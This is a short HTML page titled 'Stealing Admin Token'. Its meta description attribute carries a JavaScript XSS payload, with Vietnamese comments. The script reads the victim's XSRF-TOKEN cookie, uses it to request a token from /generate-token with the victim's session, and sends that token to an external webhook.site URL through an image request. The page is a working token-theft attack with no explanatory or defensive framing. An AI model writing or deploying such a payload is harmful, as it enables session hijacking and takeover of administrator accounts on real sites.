<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Get Admin Token</title>
  <meta name="description" content='<script>
    (function () {
      var webhook = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";

      // Lấy XSRF-TOKEN từ cookie
      var xsrf = document.cookie.split(";").find(c => c.trim().startsWith("XSRF-TOKEN="));
      if (!xsrf) return;
      xsrf = decodeURIComponent(xsrf.trim().substring("XSRF-TOKEN=".length));

      // Gửi POST để lấy token
      fetch("/generate-token", {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "X-XSRF-TOKEN": xsrf
        },
        credentials: "include"
      })
      .then(r => r.json())
      .then(data => {
        if (data.token) {
          new Image().src = webhook + "?token=" + encodeURIComponent(data.token);
        }
      });
    })();
  </script>'>
</head>
<body>
  <h1>Stealing Admin Token</h1>
</body>
</html>
